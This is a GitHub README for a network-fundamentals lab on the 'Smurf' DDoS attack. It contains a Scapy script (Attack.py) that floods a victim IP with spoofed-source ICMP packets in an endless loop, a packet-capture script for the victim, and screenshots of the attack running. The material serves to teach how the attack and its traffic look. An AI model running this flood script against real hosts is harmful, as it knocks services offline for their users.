<img width="1439" alt="image" src="https://github.com/SantoshKumarP1412/Network_Fundamentals/assets/140537888/8418fa9f-50b7-486b-9a42-9784e664ad02">## Smruf Attack

A Smurf attack is a distributed denial-of-service (DDoS) attack in which an attacker attempts to flood a targeted server with Internet Control Message Protocol (ICMP) packets.

## Lab:

## 1. Environment :

Attack Machine:

<img width="1439" alt="image" src="https://github.com/SantoshKumarP1412/Network_Fundamentals/assets/140537888/ccfa7621-e3b0-464d-9e24-bd5571bd8864">

Victim Machine:

<img width="861" alt="image" src="https://github.com/SantoshKumarP1412/Network_Fundamentals/assets/140537888/85ba55b9-a597-43e2-90c4-6fdf56e96968">


## 2. Scapy Code:

Attack.py

```
#!/usr/bin/env python

import sys

from scapy.all import *

def send_packet(srcIP, dstIP, count):
  p = IP(src=srcIP, dst=dstIP) / ICMP() 
  return send(p, count=count)

if __name__ == "__main__":
  if len(sys.argv) < 3:
    print(f"sudo {sys.argv[0]} <victim IP> <random IPs for source seperated by SPACE>")
    sys.exit(1)
  dstIP = sys.argv[1]
  srcIPs = sys.argv[2:]
  while True:
    for srcIP in srcIPs:
      send_packet(srcIP, dstIP, 100)
```



Victim.py

```
#!/usr/bin/env python3

import signal
import sys

if len(sys.argv) != 2:
  print("sudo {} <pcap file name to save>".format(sys.argv[0]))
  sys.exit(1)

pktfilename = sys.argv[1]

try:
  from scapy.all import *
except ImportError:
  import os
  os.system("pip install scapy==2.5.0 matplotlib==3.8.2 pyx==0.16 vpython==7.6.4 cryptography==42.0.2")
  sys.exit(1)


def abrt_sig_hndler(sig, frame):
  print(sig)
  print(frame)
  print("Pressed Ctrl C")
  pkts = sniffer.stop()
  # pkts.summary()
  wrpcap(pktfilename, pkts, append=True)
  sys.exit(0)

signal.signal(signal.SIGINT, abrt_sig_hndler)

sniffer = AsyncSniffer()
sniffer.start()
sniffer.join()
```
## Created PCAP file in victim machine to capture the ICMP traffic 

<img width="897" alt="image" src="https://github.com/SantoshKumarP1412/Network_Fundamentals/assets/140537888/3df8f765-a309-4bca-aa00-66b9ed3e5bc8">

## Running smruf attack from Attacker machine 

<img width="1439" alt="image" src="https://github.com/SantoshKumarP1412/Network_Fundamentals/assets/140537888/7238cff9-eff2-453d-b57f-5e01211900cf">

<img width="1439" alt="image" src="https://github.com/SantoshKumarP1412/Network_Fundamentals/assets/140537888/38c8eb83-4759-4012-9ff0-222a201eae5c">

<img width="1439" alt="image" src="https://github.com/SantoshKumarP1412/Network_Fundamentals/assets/140537888/fb492d0d-4547-4e97-a5f9-6b02aec820a4">



